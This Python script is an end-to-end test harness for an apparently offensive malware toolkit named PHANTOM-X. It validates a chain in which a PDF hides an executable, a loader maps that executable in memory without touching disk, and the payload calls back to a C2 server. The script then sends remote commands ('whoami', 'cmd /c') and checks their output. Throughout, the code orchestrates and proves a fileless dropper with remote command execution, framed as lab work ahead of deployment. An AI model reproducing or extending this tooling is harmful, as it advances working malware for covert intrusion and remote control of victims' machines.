#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM-X :: Phase 5 / Phase 3 -- full attack-chain integration test
================================================================================
test_chain_integration.py -- End-to-end proof of the PHANTOM-X chain:

    PDF document
      -> embedded PE (FlateDecode)
      -> px_loader.exe extracts it IN MEMORY (nothing written to disk)
      -> PE mapped by hand: headers, sections, relocations, imports, TLS
      -> entry point executed on a new thread
      -> payload opens a TCP session to the lab C2
      -> operator issues commands, receives real output
      -> controlled session termination

This test drives the COMPLETE chain, not the payload in isolation. It is the
artifact that proves the chain works.

On Linux the Windows binaries run under Wine so the chain can be validated
before it is deployed to the research VM. On Windows they run natively.

USAGE
    python3 test_chain_integration.py
    python3 test_chain_integration.py --json chain_result.json
    python3 test_chain_integration.py --loader-cmd "wine {loader}" ...
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

from c2_server import C2Server  # noqa: E402

DEFAULT_PDF = os.path.join(ROOT, "phase1_pdf", "samples", "px_attack_chain.pdf")
DEFAULT_LOADER = os.path.join(ROOT, "phase3_fileless", "loader", "px_loader.exe")


def wait_for_session(srv: C2Server, timeout: float = 60.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        with srv.session_lock:
            if srv.sessions:
                return list(srv.sessions.values())[0]
        time.sleep(0.1)
    return None


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Full chain integration test")
    ap.add_argument("--pdf", default=DEFAULT_PDF)
    ap.add_argument("--loader", default=DEFAULT_LOADER)
    ap.add_argument("--port", type=int, default=9401)
    ap.add_argument("--loader-cmd", default=None,
                    help="template for launching the loader; {pdf} and {port} "
                         "are substituted")
    ap.add_argument("--json", default=None)
    ap.add_argument("--timeout", type=float, default=90.0)
    args = ap.parse_args(argv)

    pdf = os.path.abspath(args.pdf)
    loader = os.path.abspath(args.loader)
    for p in (pdf, loader):
        if not os.path.exists(p):
            print(f"error: not found: {p}", file=sys.stderr)
            return 2

    if args.loader_cmd:
        cmdline = (args.loader_cmd.replace("{pdf}", pdf)
                             .replace("{loader}", loader)
                             .replace("{port}", str(args.port)))
    elif sys.platform.startswith("linux"):
        cmdline = f'wine "{loader}" "{pdf}"'
    else:
        cmdline = f'"{loader}" "{pdf}"'

    print("=" * 74)
    print("PHANTOM-X :: FULL CHAIN INTEGRATION TEST")
    print("=" * 74)
    print(f"pdf    : {pdf}")
    print(f"loader : {loader}")
    print(f"command: {cmdline}")
    print()

    srv = C2Server("127.0.0.1", args.port, "/tmp/px_chain_itest.jsonl",
                   console=False)
    threading.Thread(target=srv.start, daemon=True).start()
    time.sleep(1.0)

    env = dict(os.environ)
    env["PX_C2_HOST"] = "127.0.0.1"
    env["PX_C2_PORT"] = str(args.port)

    proc = subprocess.Popen(cmdline, shell=True, env=env,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True)
    res = {"started_utc": datetime.now(timezone.utc).isoformat(),
           "pdf": pdf, "loader": loader, "command": cmdline, "checks": []}

    def check(name, ok, detail=""):
        res["checks"].append({"name": name, "pass": bool(ok), "detail": str(detail)})
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" -- {detail}" if detail else ""))
        return ok

    ok = True
    try:
        sess = wait_for_session(srv, timeout=args.timeout)
        ok &= check("chain established a C2 session through the PDF", sess is not None,
                    f"session={sess.id}" if sess else "no session")
        if sess:
            ok &= check("HELLO parsed", sess.host not in (None, "?", ""),
                        f"host={sess.host} arch={sess.arch} pid={sess.pid}")

            lat = srv.measure_latency(sess, timeout=15)
            ok &= check("latency measured", lat is not None,
                        f"{lat:.2f} ms" if lat is not None else "no PONG")

            for cmd in ("whoami", "cmd /c echo PHANTOM_X_CHAIN_PROOF"):
                r = srv.exec(sess, cmd, timeout=30)
                out = (r or {}).get("output", "").strip()
                ok &= check(f"EXEC {cmd!r} returned output", r is not None and out != "",
                            repr(out[:120]))
                if "CHAIN_PROOF" in cmd:
                    ok &= check("command output is correct",
                                "PHANTOM_X_CHAIN_PROOF" in out, repr(out[:120]))

            ok &= check("commands were dispatched", sess.commands_completed >= 2,
                        f"completed={sess.commands_completed}")

            srv.audit.write("test_terminate", session=sess.id)
            sess.send("EXIT")
            for _ in range(60):
                if not sess.alive:
                    break
                time.sleep(0.1)
            ok &= check("controlled session termination", not sess.alive,
                        "payload acknowledged EXIT")
    finally:
        # The child may leave grandchildren holding the stdout pipe, so a
        # bare communicate() can block forever. Bound every wait.
        out = ""
        try:
            proc.terminate()
        except Exception:
            pass
        try:
            out, _ = proc.communicate(timeout=8)
        except subprocess.TimeoutExpired:
            try:
                proc.kill()
            except Exception:
                pass
            try:
                out, _ = proc.communicate(timeout=5)
            except Exception:
                out = ""
        except Exception:
            out = ""
        res["loader_stdout"] = out[-6000:]
        srv.running = False
        try:
            srv.shutdown()
        except Exception:
            pass

    res["finished_utc"] = datetime.now(timezone.utc).isoformat()
    res["result"] = "pass" if ok else "fail"
    res["audit_log"] = "/tmp/px_chain_itest.jsonl"

    print()
    print("-" * 74)
    print(f"RESULT: {'PASS' if ok else 'FAIL'}")
    print("-" * 74)
    print("Chain proven: PDF -> embedded PE -> in-memory mapping -> execution")
    print("-> C2 session -> remote command execution -> controlled teardown.")

    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(res, fh, indent=2)
        print(f"\n[+] JSON written: {os.path.abspath(args.json)}")

    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
